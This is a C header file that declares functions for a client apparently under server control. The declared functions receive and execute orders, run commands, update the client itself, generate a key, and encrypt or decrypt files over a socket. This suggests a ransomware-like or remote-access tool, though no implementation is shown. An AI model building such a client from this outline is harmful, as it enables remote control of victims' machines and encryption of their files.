#ifndef CLIENT_UTILS_H
#define CLIENT_UTILS_H 
#define FILE_CHUNK_SIZE 4096
#define STRLEN 16

#include "../commands.h"

void ensure_directory_exists(const char *folder_name);
enum OrderType get_order_enum_type(const char *buffer);
char* read_client_log_file(int n_last_line);
void execute_order_from_server(int sockfd, enum OrderType order_type, char* buffer);
int parse_and_execute_command(const Command cmd, int sockfd);
void receive_and_process_message(int sockfd, int argc, char *argv[]);
void perform_self_update(const char *new_exe_path, int sockfd, int argc, char *argv[]);
void ensure_directory_exists(const char *filepath);
char random_char(int index);
char* generate_key();
void encrypt(int sockfd,const char *filepath);
void write_encrypted_file(const char *filepath, const char *key);
void decrypt(int sockfd, const char *filepath, const char* key);
#endif
